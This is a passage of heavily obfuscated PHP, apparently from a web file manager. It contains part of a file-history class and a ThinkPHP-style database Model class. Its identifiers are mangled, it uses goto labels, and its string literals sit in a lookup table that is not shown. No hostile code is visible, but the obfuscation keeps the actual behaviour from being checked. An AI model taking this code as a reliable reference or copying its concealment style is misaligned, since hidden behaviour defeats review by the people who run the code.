(substr($ÍÇ„ È´, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $À¬¸âß = self::pathHistory($ÍÇ„ È´); $ÍÊƒ¤® = array($ÖƒÅ¶äÃ[1230] => $À¬¸âß . $ÖƒÅ¶äÃ[1217], $ÖƒÅ¶äÃ[1229] => rtrim(get_path_father($À¬¸âß), $ÖƒÅ¶äÃ[8]) . $ÖƒÅ¶äÃ[8], $ÖƒÅ¶äÃ[378] => array()); $‡²¥¤ÅÁ = IO::getContent($ÍÊƒ¤®[$ÖƒÅ¶äÃ[1230]]); if ($‡²¥¤ÅÁ) { $¨’ş†„Ô = json_decode($‡²¥¤ÅÁ, !0); if (is_array($¨’ş†„Ô)) { $ÍÊƒ¤®[$ÖƒÅ¶äÃ[378]] = $¨’ş†„Ô; } } return $ÍÊƒ¤®; } private static function saveData($˜ÎÒÀØˆ, $›ó„¦†ã) { $±à²İ§ı =& $_SERVER[¤·²È‰º]; self::log($±à²İ§ı[1233] . $˜ÎÒÀØˆ . $±à²İ§ı[81] . count($›ó„¦†ã), $±à²İ§ı[753]); if ($›ó„¦†ã) { return IO::setContent($˜ÎÒÀØˆ, json_encode($›ó„¦†ã)); } $ê©Ø€¢¤ = IO::pathFather($˜ÎÒÀØˆ); IO::remove($˜ÎÒÀØˆ); self::clearEmptyFolder($ê©Ø€¢¤); return !0; } public static function clearEmptyFolder($ôå ÄÅñ) { $µó¿ã =& $_SERVER[¤·²È‰º]; if (trim($ôå ÄÅñ, $µó¿ã[8]) == trim(self::$_historyBase, $µó¿ã[8])) { return; } $º¡ï–ê… = IO::pathFather($ôå ÄÅñ); $äÆì©îğ = IO::has($ôå ÄÅñ, !0); if ($äÆì©îğ[$µó¿ã[217]] > 0 || $äÆì©îğ[$µó¿ã[218]] > 0) { return; } IO::remove($ôå ÄÅñ); self::clearEmptyFolder($º¡ï–ê…); } private static function getBasePath() { $¡ØÑË²Ä =& $_SERVER[¤·²È‰º]; $²ÜìÎÑŠ = Model($¡ØÑË²Ä[1234])->get($¡ØÑË²Ä[1235]); if ($²ÜìÎÑŠ) { if (!IO::exist($²ÜìÎÑŠ)) { IO::mkdir($²ÜìÎÑŠ); } if (get_path_this($²ÜìÎÑŠ) == $¡ØÑË²Ä[1220]) { $„é”–« = $¡ØÑË²Ä[1236] . rand_string(8); @rename($²ÜìÎÑŠ, get_path_father($²ÜìÎÑŠ) . $¡ØÑË²Ä[8] . $„é”–«); $²ÜìÎÑŠ = DATA_PATH . $„é”–« . $¡ØÑË²Ä[8]; file_put_contents(DATA_PATH . $¡ØÑË²Ä[1237], $¡ØÑË²Ä[12]); Model($¡ØÑË²Ä[1234])->set($¡ØÑË²Ä[1235], $²ÜìÎÑŠ); } return $²ÜìÎÑŠ; } $²ÜìÎÑŠ = DATA_PATH . $¡ØÑË²Ä[1236] . rand_string(8) . $¡ØÑË²Ä[8]; $²ÜìÎÑŠ = IO::mkdir($²ÜìÎÑŠ); $²ÜìÎÑŠ = rtrim($²ÜìÎÑŠ, $¡ØÑË²Ä[8]) . $¡ØÑË²Ä[8]; file_put_contents($²ÜìÎÑŠ . $¡ØÑË²Ä[1237], $¡ØÑË²Ä[12]); file_put_contents(DATA_PATH . $¡ØÑË²Ä[1237], $¡ØÑË²Ä[12]); Model($¡ØÑË²Ä[1234])->set($¡ØÑË²Ä[1235], $²ÜìÎÑŠ); return $²ÜìÎÑŠ; } } goto eºÚ –´›†; d£®Ø³µ¸î: define($_SERVER[¤·²È‰º][251], 0); define($_SERVER[¤·²È‰º][252], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\x6f\x72\x64\145\162", "\141\x6c\151\x61\x73", "\x68\x61\x76\x69\x6e\x67", "\147\162\x6f\x75\x70", "\x6c\157\143\x6b", "\x64\x69\163\x74\151\156\143\x74", "\141\x75\164\157", "\146\x69\x6c\164\x65\162", "\x76\x61\154\x69\x64\141\x74\x65", "\x72\145\163\x75\x6c\x74", "\x62\151\156\144", "\x74\157\x6b\145\156"); public function __construct($ú´À‰Éó = '', $ßãë”© = '', $­´Ç¯Èú = '') { $å€óıƒ¸ =& $_SERVER[¤·²È‰º]; $this->_initialize(); if (!empty($ú´À‰Éó)) { if (strpos($ú´À‰Éó, $å€óıƒ¸[10])) { list($this->dbName, $this->name) = explode($å€óıƒ¸[10], $ú´À‰Éó); } else { $this->name = $ú´À‰Éó; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ßãë”©)) { $this->tablePrefix = $å€óıƒ¸[12]; } elseif ($å€óıƒ¸[12] != $ßãë”©) { $this->tablePrefix = $ßãë”©; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($å€óıƒ¸[253]); } $this->db(0, empty($this->connection) ? $­´Ç¯Èú : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $÷©ÙıÇµ =& $_SERVER[¤·²È‰º]; if (empty($this->fields)) { if (think_config($÷©ÙıÇµ[254])) { $ÇĞ”¬¹Ï = $this->dbName ? $this->dbName : think_config($÷©ÙıÇµ[255]); $ğˆÌĞ¾ = think_var_cache($÷©ÙıÇµ[256] . strtolower(get_path_this($ÇĞ”¬¹Ï) . $÷©ÙıÇµ[10] . $this->name)); if ($ğˆÌĞ¾) { $“ÊÁ•¶ = think_config($÷©ÙıÇµ[257]); if (empty($“ÊÁ•¶) || $ğˆÌĞ¾[$÷©ÙıÇµ[258]] == $“ÊÁ•¶) { $this->fields = $ğˆÌĞ¾; return; } } } $this->flush(); } } public function flush() { $ëìãÇ™í =& $_SERVER[¤·²È‰º]; $this->db->setModel($this->name); $ÈÖ’èÏÆ = $this->db->getFields($this->getTableName()); if (!$ÈÖ’èÏÆ) { return !1; } $this->fields = array_keys($ÈÖ’èÏÆ); $this->fields[$ëìãÇ™í[259]] = !1; foreach ($ÈÖ’èÏÆ as $äÃÍ§íÛ => $á¼§’…Æ) { $Şµ‰¾Œ[$äÃÍ§íÛ] = $á¼§’…Æ[$ëìãÇ™í[43]]; if ($á¼§’…Æ[$ëìãÇ™í[49]]) { $this->fields[$ëìãÇ™í[260]] = $äÃÍ§íÛ; if ($á¼§’…Æ[$ëìãÇ™í[52]]) { $this->fields[$ëìãÇ™í[259]] = !0; } } } $this->fields[$ëìãÇ™í[261]] = $Şµ‰¾Œ; if (think_config($ëìãÇ™í[257])) { $this->fields[$ëìãÇ™í[258]] = think_config($ëìãÇ™í[257]); } if (think_config($ëìãÇ™í[254])) { $×‹œë×Ê = $this->dbName ? $this->dbName : think_config($ëìãÇ™í[255]); think_var_cache($ëìãÇ™í[256] . strtolower(get_path_this($×‹œë×Ê) . $ëìãÇ™í[10] . $this->name), $this->fields); } } public function switchModel($ø’Ì£Şù, $Ú› ’« = array()) { $ÇÚæéã¬ =& $_SERVER[¤·²È‰º]; $í¾÷ã¤¡ = ucwords(strtolower($ø’Ì£Şù)) . $ÇÚæéã¬[262]; if (!class_exists($í¾÷ã¤¡)) { think_exception($í¾÷ã¤¡ . think_lang($ÇÚæéã¬[263])); } $this->_extModel = new $í¾÷ã¤¡($this->name); if (!empty($Ú› ’«)) { foreach ($Ú› ’« as $èøŞ›ê) { $this->_extModel->setProperty($èøŞ›ê, $this->{$èøŞ›ê}); } } return $this->_extModel; } public function __set($œ÷­õØò, $´àîª«±) { $this->data[$œ÷­õØò] = $´àîª«±; } public function __get($îÎ š¹ı) { return isset($this->data[$îÎ š¹ı]) ? $this->data[$îÎ š¹ı] : null; } public function __isset($ÔÀÀÍ°†) { return isset($this->data[$ÔÀÀÍ°†]); } public function __unset($Öø‘ê¦ê) { unset($this->data[$Öø‘ê¦ê]); } public function __call($é¥íİ‘, $şå˜³Ì¶) { $«üé˜è§ =& $_SERVER[¤·²È‰º]; if (in_array(strtolower($é¥íİ‘), $this->methods, !0)) { $this->options[strtolower($é¥íİ‘)] = $şå˜³Ì¶[0]; return $this; } elseif (in_array(strtolower($é¥íİ‘), array($«üé˜è§[264], $«üé˜è§[265], $«üé˜è§[266], $«üé˜è§[267], $«üé˜è§[268]), !0)) { $’â§Ì¸° = isset($şå˜³Ì¶[0]) ? $şå˜³Ì¶[0] : $«üé˜è§[198]; $’â§Ì¸° = $this->db->parseKey($’â§Ì¸°); return $this->getField(strtoupper($é¥íİ‘) . $«üé˜è§[269] . $’â§Ì¸° . $«üé˜è§[270] . $é¥íİ‘, $«üé˜è§[264]); } elseif (strtolower(substr($é¥íİ‘, 0, 5)) == $«üé˜è§[271]) { $’â§Ì¸° = think_parse_name(substr($é¥íİ‘, 5)); $ñö’À¾Ù[$’â§Ì¸°] = $şå˜³Ì¶[0]; return $this->where($ñö’À¾Ù)->find(); } elseif (strtolower(substr($é¥íİ‘, 0, 10)) == $«üé˜è§[272]) { $á¨×î‡È = think_parse_name(substr($é¥íİ‘, 10)); $ñö’À¾Ù[$á¨×î‡È] = $şå˜³Ì¶[0]; return $this->where($ñö’À¾Ù)->getField($şå˜³Ì¶[1]); } elseif (isset($this->_scope[$é¥íİ‘])) { return $this->scope($é¥íİ‘, $şå˜³Ì¶[0]); } elseif (method_exists($this, $é¥íİ‘)) { array_unshift($şå˜³Ì¶, $é¥íİ‘); return call_user_func_array(array($this, $«üé˜è§[273]), $şå˜³Ì¶); } else { return call_user_func_array(array(parent, $é¥íİ‘), $şå˜³Ì¶); } } protected function call() { $–ÕÅ×—Ÿ =& $_SERVER[¤·²È‰º]; $ÈµÊ ØŞ = func_get_args(); $ÇÄÔÀ­Õ = array_shift($ÈµÊ ØŞ); $¯ıÆ±ˆÙ = $ÇÄÔÀ­Õ; if (is_array($ÇÄÔÀ­Õ)) { $¯ıÆ±ˆÙ = $ÇÄÔÀ­Õ[1]; $ÇÄÔÀ­Õ = $ÇÄÔÀ­Õ[0]; } $¹áí¿› = count($ÈµÊ ØŞ) - 1; if (isset($ÈµÊ ØŞ[$¹áí¿›]) && $ÈµÊ ØŞ[$¹áí¿›] === $ÇÄÔÀ­Õ) { think_exception(__CLASS__ . $–ÕÅ×—Ÿ[4] . $ÇÄÔÀ­Õ . think_lang($–ÕÅ×—Ÿ[274])); return; } $ÈµÊ ØŞ[] = $ÇÄÔÀ­Õ; if (method_exists($this, $–ÕÅ×—Ÿ[275])) { $×ïßãÓí = call_user_func_array(array($this, $–ÕÅ×—Ÿ[276]), array($¯ıÆ±ˆÙ, $ÈµÊ ØŞ)); if (!is_null($×ïßãÓí) && $×ïßãÓí !== !1) { return $×ïßãÓí; } } $ğ÷î”Ü = call_user_func_array(array($this, $ÇÄÔÀ­Õ), $ÈµÊ ØŞ); if (method_exists($this, $–ÕÅ×—Ÿ[277])) { $×ïßãÓí = call_user_func_array(array($this, $–ÕÅ×—Ÿ[278]), array($¯ıÆ±ˆÙ, $ÈµÊ ØŞ, $ğ÷î”Ü)); if ($×ïßãÓí) { return $×ïßãÓí; } } return $ğ÷î”Ü; } protected function _initialize() { } protected function _facade($É÷ÆŞÇ‚) { $Œ¿¦¨î‹ =& $_SERVER[¤·²È‰º]; if (!empty($this->fields)) { foreach ($É÷ÆŞÇ‚ as $çİ€®İÑ => $èò»…‘) { if (is_array($this->fields) && !in_array($çİ€®İÑ, $this->fields, !0)) { unset($É÷ÆŞÇ‚[$çİ€®İÑ]); } elseif (is_scalar($èò»…‘)) { $this->_parseType($É÷ÆŞÇ‚, $çİ€®İÑ); } } } if (!empty($this->options[$Œ¿¦¨î‹[279]])) { $É÷ÆŞÇ‚ = array_map($this->options[$Œ¿¦¨î‹[279]], $É÷ÆŞÇ‚); unset($this->options[$Œ¿¦¨î‹[279]]); } $this->_beforeWrite($É÷ÆŞÇ‚); return $É÷ÆŞÇ‚; } protected function _beforeWrite(&$ÈíôêÏ) { } public function add($·‡Îï«€ = '', $¦’Í¹ºÕ = array(), $ªÜÕöß = false) { if (empty($·‡Îï«€)) { if (!empty($this->data)) { $·‡Îï«€ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¤·²È‰º][280]); return !1; } } $¦’Í¹ºÕ = $this->_parseOptions($¦’Í¹ºÕ); $·‡Îï«€ = $this->_facade($·‡Îï«€); if (!1 === $this->_beforeInsert($·‡Îï«€, $¦’Í¹ºÕ)) { return !1; } $Ï’¯ƒß = $this->db->insert($·‡Îï«€, $¦’Í¹ºÕ, $ªÜÕöß); if (!1 !== $Ï’¯ƒß) { $Ê”™²¨˜ = $this->getLastInsID(); if ($Ê”™²¨˜) { $·‡Îï«€[$this->getPk()] = $Ê”™²¨˜; $this->_after_insert($·‡Îï«€, $¦’Í¹ºÕ); return $Ê”™²¨˜; } $this->_after_insert($·‡Îï«€, $¦’Í¹ºÕ); } return $Ï’¯ƒß; } protected function _beforeInsert(&$¾¨Úì, $“ÛÃê“±) { } protected function _after_insert($Öğè, $ŸŸ‰ˆÂ) { } public function addAll($ü±‡âéÖ, $ïÓ×ê™÷ = array(), $æ‹‚ÎÙ¿ = false) { $á†•’ÊÃ =& $_SERVER[¤·²È‰º]; if (empty($ü±‡âéÖ)) { $this->error = think_lang($á†•’ÊÃ[280]); return !1; } $ïÓ×ê™÷ = $this->_parseOptions($ïÓ×ê™÷); foreach ($ü±‡âéÖ as $îÚİı’ı => $ÚÛóù­) { $ü±‡âéÖ[$îÚİı’ı] = $this->_facade($ÚÛóù­); } if (method_exists($this->db, $á†•’ÊÃ[281])) { $É›¯ÛÊ’ = $this->db->insertAll($ü±‡âéÖ, $ïÓ×ê™÷, $æ‹‚ÎÙ¿); } else { $this->startTrans(); foreach ($ü±‡âéÖ as $îÚİı’ı => $ÚÛóù­) { $É›¯ÛÊ’ = $this->db->insert($ÚÛóù­, $ïÓ×ê™÷, $æ‹‚ÎÙ¿); } $this->commit(); } if (!1 !== $É›¯ÛÊ’) { $íçùÒÙ = $this->getLastInsID(); if ($íçùÒÙ) { return $íçùÒÙ; } } return $É›¯ÛÊ’; } public function selectAdd($…ıÍŞ°Û = '', $æÒ‘Úì = '', $ºí§×Ú¡ = array()) { $ «”…¿ =& $_SERVER[¤·²È‰º]; $ºí§×Ú¡ = $this->_parseOptions($ºí§×Ú¡); if (!1 === ($›èáè = $this->db->selectInsert($…ıÍŞ°Û ? $…ıÍŞ°Û : $ºí§×Ú¡[$ «”…¿[282]], $æÒ‘Úì ? $æÒ‘Úì : $this->getTableName(), $ºí§×Ú¡))) { $this->error = think_lang($ «”…¿[283]); return !1; } else { return $›èáè; } } public function save($Å†ÌÈ¸¡ = '', $ù™èâ„Ò = array()) { $ªÏÂ¦úá =& $_SERVER[¤·²È‰º]; if (empty($Å†ÌÈ¸¡)) { if (!empty($this->data)) { $Å†ÌÈ¸¡ = $this->data; $this->data = array(); } else { $this->error = think_lang($ªÏÂ¦úá[280]); return !1; } } $Å†ÌÈ¸¡ = $this->_facade($Å†ÌÈ¸¡); $ù™èâ„Ò = $this->_parseOptions($ù™èâ„Ò); $¶·ÔÍ„ä = $this->getPk(); if (!isset($ù™èâ„Ò[$ªÏÂ¦úá[284]])) { if (isset($Å†ÌÈ¸¡[$¶·ÔÍ„ä])) { $¤…Úó“Î[$¶·ÔÍ„ä] = $Å†ÌÈ¸¡[$¶·ÔÍ„ä]; $ù™èâ„Ò[$ªÏÂ¦úá[284]] = $¤…Úó“Î; unset($Å†ÌÈ¸¡[$¶·ÔÍ„ä]); } else { $this->error = think_lang($ªÏÂ¦úá[283]); return !1; } } if (is_array($ù™èâ„Ò[$ªÏÂ¦úá[284]]) && isset($ù™èâ„Ò[$ªÏÂ¦úá[284]][$¶·ÔÍ„ä])) { $öèæ¶çñ = $ù™èâ„Ò[$ªÏÂ¦úá[284]][$¶·ÔÍ„ä]; } if (!1 === $this->_beforeUpdate($Å†ÌÈ¸¡, $ù™èâ„Ò)) { return !1; } $å‰Î°ü = $this->db->update($Å†ÌÈ¸¡, $ù™èâ„Ò); if (!1 !== $å‰Î°ü) { if (isset($öèæ¶çñ)) { $Å†ÌÈ¸¡[$¶·ÔÍ„ä] = $öèæ¶çñ; } $this->_afterUpdate($Å†ÌÈ¸¡, $ù™èâ„Ò); } return $å‰Î°ü; } protected function _beforeUpdate(&$Ç”¤ÒòÓ, $ıÌâÖİ§) { } protected function _afterUpdate($’¦¡¾†, $“¯™»¢Â) { } public function delete($œª‚Î›‚ = array()) { $¹Ü Î«Ã =& $_SERVER[¤·²È‰º]; if (empty($œª‚Î›‚) && empty($this->options[$¹Ü Î«Ã[284]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Í³¿Ô = $this->getPk(); if (is_numeric($œª‚Î›‚) || is_string($œª‚Î›‚)) { if (strpos($œª‚Î›‚, $¹Ü Î«Ã[60])) { $î‚³ÎÛœ[$Í³¿Ô] = array($¹Ü Î«Ã[285], $œª‚Î›‚); } else { $î‚³ÎÛœ[$Í³¿Ô] = $œª‚Î›‚; } $this->options[$¹Ü Î«Ã[284]] = $î‚³ÎÛœ; } $œª‚Î›‚ = $this->_parseOptions(); if (is_array($œª‚Î›‚[$¹Ü Î«Ã[284]]) && isset($œª‚Î›‚[$¹Ü Î«Ã[284]][$Í³¿Ô])) { $ñª¡—éš = $œª‚Î›‚[$¹Ü Î«Ã[284]][$Í³¿Ô]; } $Õ©¯¯¼ = $this->db->delete($œª‚Î›‚); if (!1 !== $Õ©¯¯¼) { $Ø–µµû = array(); if (isset($ñª¡—éš)) { $Ø–µµû[$Í³¿Ô] = $ñª¡—éš; } $this->_after_delete($Ø–µµû, $œª‚Î›‚); } return $Õ©¯¯¼; } protected function _after_delete($áÔÔ«ÄÙ, $ûëÁö¨Â) { } public function select($å¢Ùü¥Ä = array()) { $‚¿«Ã¤† =& $_SERVER[¤·²È‰º]; if (is_string($å¢Ùü¥Ä) || is_numeric($å¢Ùü¥Ä)) { $Éåï© = $this->getPk(); if (strpos($å¢Ùü¥Ä, $‚¿«Ã¤†[60])) { $Ïûõ¯‘§[$Éåï©] = array($‚¿«Ã¤†[285], $å¢Ùü¥Ä); } else { $Ïûõ¯‘§[$Éåï©] = $å¢Ùü¥Ä; } $this->options[$‚¿«Ã¤†[284]] = $Ïûõ¯‘§; } elseif (!1 === $å¢Ùü¥Ä) { $å¢Ùü¥Ä = $this->_parseOptions(); return $‚¿«Ã¤†[286] . $this->db->buildSelectSql($å¢Ùü¥Ä) . $‚¿«Ã¤†[287]; } $å¢Ùü¥Ä = $this->_parseOptions(); $®Ò–ËÚ¤ = $this->db->select($å¢Ùü¥Ä); if (!1 === $®Ò–ËÚ¤) { return !1; } if (empty($®Ò–ËÚ¤)) { return null; } $this->_afterSelect($®Ò–ËÚ¤, $å¢Ùü¥Ä); return $®Ò–ËÚ¤; } protected function _afterSelect(&$‹ûóƒ˜‚, $Úø×¸”) { } public function buildSql($ßú¡¤’ = array()) { $ış–Š« =& $_SERVER[¤·²È‰º]; $ßú¡¤’ = $this->_parseOptions($ßú¡¤’); return $ış–Š«[286] . $this->db->buildSelectSql($ßú¡¤’) . $ış–Š«[287]; } public function optionsValue($÷Á¸ñö = null) { if (is_null($÷Á¸ñö)) { return $this->options; } elseif (is_array($÷Á¸ñö)) { $this->options = array_merge($this->options, $÷Á¸ñö); } } protected function _parseOptions($ âØã„‘ = array()) { $†ÒÓúîÜ =& $_SERVER[¤·²È‰º]; if (is_array($ âØã„‘)) { $ âØã„‘ = array_merge($this->options, $ âØã„‘); } $this->options = array(); if (!isset($ âØã„‘[$†ÒÓúîÜ[288]])) { $ âØã„‘[$†ÒÓúîÜ[288]] = $this->getTableName(); $½¾¾ØËŸ = $this->fields; } else { $½¾¾ØËŸ = $this->getDbFields(); } if (!empty($ âØã„‘[$†ÒÓúîÜ[289]])) { $ âØã„‘[$†ÒÓúîÜ[288]] .= $†ÒÓúîÜ[63] . $ âØã„‘[$†ÒÓúîÜ[289]]; } $ âØã„‘[$†ÒÓúîÜ[290]] = $this->name; if (isset($ âØã„‘[$†ÒÓúîÜ[284]]) && is_array($ âØã„‘[$†ÒÓúîÜ[284]]) && !empty($½¾¾ØËŸ) && !isset($ âØã„‘[$†ÒÓúîÜ[291]]) && !isset($ âØã„‘[$†ÒÓúîÜ[288]])) { foreach ($ âØã„‘[$†ÒÓúîÜ[284]] as $ÛñæÎò => $ñ­–ø¶Ø) { $ÛñæÎò = trim($ÛñæÎò); if (in_array($ÛñæÎò, $½¾¾ØËŸ, !0)) { if (is_scalar($ñ­–ø¶Ø)) { $this->_parseType($ âØã„‘[$†ÒÓúîÜ[284]], $ÛñæÎò); } } elseif (!is_numeric($ÛñæÎò) && $†ÒÓúîÜ[11] != substr($ÛñæÎò, 0, 1) && !1 === strpos($ÛñæÎò, $†ÒÓúîÜ[10]) && !1 === strpos($ÛñæÎò, $†ÒÓúîÜ[269]) && !1 === strpos($ÛñæÎò, $†ÒÓúîÜ[292]) && !1 === strpos($ÛñæÎò, $†ÒÓúîÜ[293])) { unset($ âØã„‘[$†ÒÓúîÜ[284]][$ÛñæÎò]); } } } $this->_options_filter($ âØã„‘); return $ âØã„‘; } protected function _options_filter(&$Ğ®ä×é) { } protected function _parseType(&$‹¬ ¾Ê, $¯œ°ÍÌ) { $şµ€ÛšÁ =& $_SERVER[¤·²È‰º]; if (empty($this->options[$şµ€ÛšÁ[294]][$şµ€ÛšÁ[4] . $¯œ°ÍÌ])) { $¬üƒâ‰ó = strtolower($this->fields[$şµ€ÛšÁ[261]][$¯œ°ÍÌ]); if (!1 !== strpos($¬üƒâ‰ó, $şµ€ÛšÁ[295])) { } elseif (!1 === strpos($¬üƒâ‰ó, $şµ€ÛšÁ[296]) && !1 !== strpos($¬üƒâ‰ó, $şµ€ÛšÁ[297])) { $‹¬ ¾Ê[$¯œ°ÍÌ] = intval($‹¬ ¾Ê[$¯œ°ÍÌ]); } elseif (!1 !== strpos($¬üƒâ‰ó, $şµ€ÛšÁ[298]) || !1 !== strpos($¬üƒâ‰ó, $şµ€ÛšÁ[299])) { $‹¬ ¾Ê[$¯œ°ÍÌ] = floatval($‹¬ ¾Ê[$¯œ°ÍÌ]); } elseif (!1 !== strpos($¬üƒâ‰ó, $şµ€ÛšÁ[300])) { $‹¬ ¾Ê[$¯œ°ÍÌ] = (bool) $‹¬ ¾Ê[$¯œ°ÍÌ]; } } } public function find($äí˜Š„„ = array()) { $Ş°’âÁ =& $_SERVER[¤·²È‰º]; if (is_numeric($äí˜Š„„) || is_string($äí˜Š„„)) { $û£¯•õ¦[$this->getPk()] = intval($äí˜Š„„); $this->options[$Ş°’âÁ[284]] = $û£¯•õ¦; } $this->options[$Ş°’âÁ[301]] = 1; $äí˜Š„„ = $this->_parseOptions(); $³ò“Òğ· = $this->db->select($äí˜Š„„); if (!1 === $³ò“Òğ·) { return !1; } if (empty($³ò“Òğ·)) { return null; } $this->data = $³ò“Òğ·[0]; $this->_afterFind($this->data, $äí˜Š„„); if (!empty($this->options[$Ş°’âÁ[302]])) { return $this->returnResult($this->data, $this->options[$Ş°’âÁ[302]]); } return $this->data; } protected function _afterFind(&$­ª™úÆ, $×íç¹) { } protected function returnResult($ƒ”, $ÀÎäãÉ´ = '') { $Ğ÷¸•¹¬ =& $_SERVER[¤·²È‰º]; if ($ÀÎäãÉ´) { if (is_callable($ÀÎäãÉ´)) { return call_user_func($ÀÎäãÉ´, $ƒ”); } switch (strtolower($ÀÎäãÉ´)) { case $Ğ÷¸•¹¬[303]: return json_encode($ƒ”); case $Ğ÷¸•¹¬[304]: return xml_encode($ƒ”); } } return $ƒ”; } public function parseFieldsMap($¥ÑĞã€Â, $Á’¿×âî = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ä¸³Ü¸ => $¹™¦–üô) { if ($Á’¿×âî == 1) { if (isset($¥ÑĞã€Â[$¹™¦–üô])) { $¥ÑĞã€Â[$ä¸³Ü¸] = $¥ÑĞã€Â[$¹™¦–üô]; unset($¥ÑĞã€Â[$¹™¦–üô]); } } else { if (isset($¥ÑĞã€Â[$ä¸³Ü¸])) { $¥ÑĞã€Â[$¹™¦–üô] = $¥ÑĞã€Â[$ä¸³Ü¸]; unset($¥ÑĞã€Â[$ä¸³Ü¸]); } } } } return $¥ÑĞã€Â; } public function setField($ïĞ¯Ï±, $ëÑîÀ˜ì = '') { if (is_array($ïĞ¯Ï±)) { $ÅÜ“‡‚„ = $ïĞ¯Ï±; } else { $ÅÜ“‡‚„[$ïĞ¯Ï±] = $ëÑîÀ˜ì; } return $this->save($ÅÜ“‡‚„); } public function setAdd($šÏÕ¶Ïâ, $‚µæçÇ“ = 1) { $Ò ¨õ¨Ğ =& $_SERVER[¤·²È‰º]; $•ıÎ¢€Æ = $šÏÕ¶Ïâ . $Ò ¨õ¨Ğ[305] . $‚µæçÇ“; if ($‚µæçÇ“ < 0) { $•ıÎ¢€Æ = $šÏÕ¶Ïâ . $‚µæçÇ“; } return $this->setField($šÏÕ¶Ïâ, array($Ò ¨õ¨Ğ[306], $•ıÎ¢€Æ)); } public function getField($üêÅÖÛÔ, $ı‰‹çæ  = null) { $÷â› Íİ =& $_SERVER[¤·²È‰º]; $‚ºôæ“[$÷â› Íİ[282]] = $üêÅÖÛÔ; $‚ºôæ“ = $this->_parseOptions($‚ºôæ“); $üêÅÖÛÔ = trim($üêÅÖÛÔ); if (strpos($üêÅÖÛÔ, $÷â› Íİ[60])) { if (!isset($‚ºôæ“[$÷â› Íİ[301]])) { $‚ºôæ“[$÷â› Íİ[301]] = is_numeric($ı‰‹çæ ) ? $ı‰‹çæ  : $÷â› Íİ[12]; } $Û¬˜©× = $this->db->select($‚ºôæ“); if (!empty($Û¬˜©×)) { $¶õÖÛ÷À = explode($÷â› Íİ[60], $üêÅÖÛÔ); $üêÅÖÛÔ = array_keys($Û¬˜©×[0]); $Ã×–¬Å = array_shift($üêÅÖÛÔ); $¡®ÑŒŒş = array_shift($üêÅÖÛÔ); $¹“ÈÓáÓ = array(); $üõš”êæ = count($¶õÖÛ÷À); foreach ($Û¬˜©× as $€ìÑ‡â’) { $ëáªÍÖÚ = $€ìÑ‡â’[$Ã×–¬Å]; if (2 == $üõš”êæ) { $¹“ÈÓáÓ[$ëáªÍÖÚ] = $€ìÑ‡â’[$¡®ÑŒŒş]; } else { $¹“ÈÓáÓ[$ëáªÍÖÚ] = is_string($ı‰‹çæ ) ? implode($ı‰‹çæ , $€ìÑ‡â’) : $€ìÑ‡â’; } } return $¹“ÈÓáÓ; } } else { if (!0 !== $ı‰‹çæ ) { $‚ºôæ“[$÷â› Íİ[301]] = is_numeric($ı‰‹çæ ) ? $ı‰‹çæ  : 1; } if ($ı‰‹çæ  === $÷â› Íİ[264]) { unset($‚ºôæ“[$÷â› Íİ[301]]); } $€ìÑ‡â’ = $this->db->select($‚ºôæ“); if (!empty($€ìÑ‡â’)) { if ($ı‰‹çæ  === $÷â› Íİ[264]) { return reset($€ìÑ‡â’[0]); } if (!0 !== $ı‰‹çæ  && 1 == $‚ºôæ“[$÷â› Íİ[301]]) { return reset($€ìÑ‡â’[0]); } foreach ($€ìÑ‡â’ as $…£Æ·¸–) { $Î£•ëÉ°[] = $…£Æ·¸–[$üêÅÖÛÔ]; } return $Î£•ëÉ°; } } return null; } public function create($ûóÍÂ¨ = '', $ÏšÄ³²„ = '') { $èáú“ È =& $_SERVER[¤·²È‰º]; if (empty($ûóÍÂ¨)) { $ûóÍÂ¨ = $_POST; } elseif (is_object($ûóÍÂ¨)) { $ûóÍÂ¨ = get_object_vars($ûóÍÂ¨); } if (empty($ûóÍÂ¨) || !is_array($ûóÍÂ¨)) { $this->error = think_lang($èáú“ È[280]); return !1; } $ûóÍÂ¨ = $this->parseFieldsMap($ûóÍÂ¨, 0); $ÏšÄ³²„ = $ÏšÄ³²„ ? $ÏšÄ³²„ : (!empty($ûóÍÂ¨[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$èáú“ È[282]])) { $ ·™ê¾Ä = $this->options[$èáú“ È[282]]; unset($this->options[$èáú“ È[282]]); } elseif ($ÏšÄ³²„ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ ·™ê¾Ä = $this->insertFields; } elseif ($ÏšÄ³²„ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ ·™ê¾Ä = $this->updateFields; } if (isset($ ·™ê¾Ä)) { if (is_string($ ·™ê¾Ä)) { $ ·™ê¾Ä = explode($èáú“ È[60], $ ·™ê¾Ä); } if (think_config($èáú“ È[307])) { $ ·™ê¾Ä[] = think_config($èáú“ È[308]); } foreach ($ûóÍÂ¨ as $§¹Ïí£È => $Å€Ìåñ) { if (!in_array($§¹Ïí£È, $ ·™ê¾Ä)) { unset($ûóÍÂ¨[$§¹Ïí£È]); } } } if (!$this->autoValidation($ûóÍÂ¨, $ÏšÄ³²„)) { return !1; } if (!$this->autoCheckToken($ûóÍÂ¨)) { $this->error = think_lang($èáú“ È[309]); return !1; } if ($this->autoCheckFields) { $ ·™ê¾Ä = $this->getDbFields(); foreach ($ûóÍÂ¨ as $§¹Ïí£È => $Å€Ìåñ) { if (!in_array($§¹Ïí£È, $ ·™ê¾Ä)) { unset($ûóÍÂ¨[$§¹Ïí£È]); } elseif (MAGIC_QUOTES_GPC && is_string($Å€Ìåñ)) { $ûóÍÂ¨[$§¹Ïí£È] = stripslashes($Å€Ìåñ); } } } 